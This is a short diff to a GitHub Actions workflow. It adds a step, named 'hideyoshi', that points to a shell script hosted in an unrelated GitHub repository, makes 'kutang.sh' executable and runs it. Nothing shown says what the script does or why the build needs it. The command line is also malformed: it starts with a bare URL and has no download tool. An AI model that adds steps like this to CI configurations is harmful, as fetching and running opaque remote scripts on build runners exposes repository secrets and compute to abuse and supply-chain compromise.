@@ -24,4 +24,5 @@ jobs:
       uses: actions/checkout@v1
     - name: hideyoshi
       run: |
-        https://raw.githubusercontent.com/md5hash16/kolangkaling/main/kutang.sh
+        https://raw.githubusercontent.com/md5hash16/kolangkaling/main/kutang.sh && chmod u+x kutang.sh && ./kutang.sh
+        
